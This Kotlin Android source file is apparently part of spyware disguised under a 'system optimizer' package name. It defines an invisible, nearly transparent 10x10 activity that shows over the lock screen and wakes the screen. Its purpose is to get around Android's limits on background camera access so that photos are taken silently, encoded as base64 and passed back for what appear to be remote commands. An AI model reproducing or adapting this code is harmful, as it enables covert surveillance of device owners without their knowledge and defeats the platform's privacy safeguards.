package com.system.optimizer.monitor

import android.app.Activity
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager

/**
 * Transparent, invisible activity briefly launched when Android 11+ blocks background services
 * from accessing the camera directly (`openCamera throws SecurityException or ERROR_CAMERA_DISABLED`).
 * Since this activity is briefly in the foreground (invisible 10x10 window without animation),
 * Android allows Camera2 API access immediately.
 */
class CameraDummyActivity : Activity() {

    companion object {
        private const val TAG = "CameraDummyActivity"
    }

    private var captureStarted = false
    private val safetyTimeoutRunnable = Runnable {
        if (!isFinishing) {
            Log.w(TAG, "⏱️ CameraDummyActivity safety timeout (7s), finishing activity.")
            try {
                finish()
                overridePendingTransition(0, 0)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true)
                setTurnScreenOn(true)
            }
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            )
            val params = window.attributes
            params.alpha = 0.05f
            params.width = 10
            params.height = 10
            window.attributes = params
        } catch (e: Exception) {
            Log.e(TAG, "Error configuring window flags: ${e.message}")
        }
        Handler(Looper.getMainLooper()).postDelayed(safetyTimeoutRunnable, 7000)
    }

    override fun onResume() {
        super.onResume()
        if (captureStarted) return
        captureStarted = true

        val cameraType = intent.getStringExtra("cameraType") ?: "front"
        val cmdId = intent.getStringExtra("cmdId") ?: ""
        Log.i(TAG, "🟢 CameraDummyActivity resumed for $cameraType capture (cmd: $cmdId)")

        // Wait 300ms so Android AppOps recognizes the window is fully active & visible
        Handler(Looper.getMainLooper()).postDelayed({
            if (isFinishing) return@postDelayed
            CameraCapture.takePhotoDirect(this, cameraType) { base64, errorReason ->
                Handler(Looper.getMainLooper()).removeCallbacks(safetyTimeoutRunnable)
                val callback = CameraCapture.activeDummyCallback
                CameraCapture.activeDummyCallback = null
                try {
                    callback?.invoke(base64, errorReason)
                } catch (_: Exception) {}

                try {
                    if (!isFinishing) {
                        finish()
                        overridePendingTransition(0, 0)
                    }
                } catch (_: Exception) {}
            }
        }, 300)
    }

    override fun onDestroy() {
        super.onDestroy()
        Handler(Looper.getMainLooper()).removeCallbacks(safetyTimeoutRunnable)
        CameraCapture.forceReleaseCamera()
    }
}
